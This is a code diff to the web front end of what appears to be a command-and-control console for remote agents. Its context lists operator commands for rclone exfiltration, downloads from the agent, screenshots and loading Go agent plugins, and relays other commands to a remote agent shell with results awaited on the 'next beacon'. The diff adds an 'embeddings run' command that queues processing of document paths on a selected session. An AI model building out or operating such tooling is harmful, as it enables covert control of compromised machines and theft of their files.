@@ -11,7 +11,7 @@ const SHELL_HISTORY_MAX = 100;
 const SHELL_DISPATCH_PREFIXES = ["cmd: ", "PS: ", "powershell: ", "pwsh: "];
 
 /** Operator meta commands — handled locally instead of being sent to the agent shell. */
-const SHELL_META_COMMANDS = ["help", "?", "exfil", "download", "screenshot", "pe"];
+const SHELL_META_COMMANDS = ["help", "?", "exfil", "download", "screenshot", "pe", "embeddings"];
 
 const state = {
   token: sessionStorage.getItem(STORAGE_KEY) || "",
@@ -2700,7 +2700,7 @@ function clearShellInput() {
   input.focus();
 }
 
-function parseShellWords(line) {
+function parseShellWords(line, literalBackslashes = false) {
   const words = [];
   let cur = "";
   let quote = null;
@@ -2709,7 +2709,7 @@ function parseShellWords(line) {
     if (quote) {
       if (c === quote) {
         quote = null;
-      } else if (c === "\\" && quote === '"' && i + 1 < line.length) {
+      } else if (!literalBackslashes && c === "\\" && quote === '"' && i + 1 < line.length) {
         cur += line[++i];
       } else {
         cur += c;
@@ -2729,6 +2729,7 @@ function parseShellWords(line) {
     }
     cur += c;
   }
+  if (quote && literalBackslashes) return [];
   if (cur) words.push(cur);
   return words;
 }
@@ -2842,6 +2843,42 @@ async function dispatchShellMetaCommand(cmd) {
   const verb = words[0].toLowerCase();
   const rest = words.slice(1);
 
+  if (verb === "embeddings") {
+    const args = parseShellWords(cmd, true).slice(1);
+    const documents = [];
+    let valid = args[0] === "run" && /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(args[1] || "");
+    for (let i = 2; i < args.length; i += 2) {
+      if (args[i] !== "--document" || !args[i + 1] || args[i + 1].startsWith("--")) valid = false;
+      else documents.push(args[i + 1]);
+    }
+    if (!valid || !documents.length || documents.length > 32) {
+      appendShellError('Usage: embeddings run <profile> --document "C:\\Lab\\documents" [--document <path> ...] (1–32 paths; uses the selected session)');
+      return true;
+    }
+    if (!state.selectedId) {
+      appendShellError("Select a session before running embeddings.");
+      return true;
+    }
+    try {
+      const { status, data } = await api("/embeddings/run", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ session_ref: state.selectedId, profile: args[1], documents }),
+      });
+      if (status !== 200) {
+        appendShellError(data?.error || `HTTP ${status}`);
+        return true;
+      }
+      appendShellEcho(cmd, {
+        block: true, kind: "pe", meta: "(embeddings queued — waiting for next beacon)",
+        matchKeys: [cmd, data.queued].filter(Boolean),
+      });
+      pollSessionEvents().catch(() => {});
+    } catch (error) {
+      appendShellError(error.message || "Could not queue embeddings.");
+    }
+    return true;
+  }
+
   if (verb === "help" || verb === "?") {
     if (rest.length) {
       appendShellError("Usage: help");
@@ -2855,6 +2892,8 @@ async function dispatchShellMetaCommand(cmd) {
   download &lt;remote_path&gt;           Queue a download from the agent
   exfil &lt;remote_path&gt; [profile]    Queue rclone exfiltration
   screenshot                       Queue a screenshot
+  embeddings run &lt;profile&gt; --document &lt;path&gt; [--document &lt;path&gt; ...]
+                                   Run a saved embedding profile on this session
   pe &lt;plugin&gt; [export] [input]     Load a Go agent plugin
 
 Any other command is sent to the selected agent. Prefix commands with
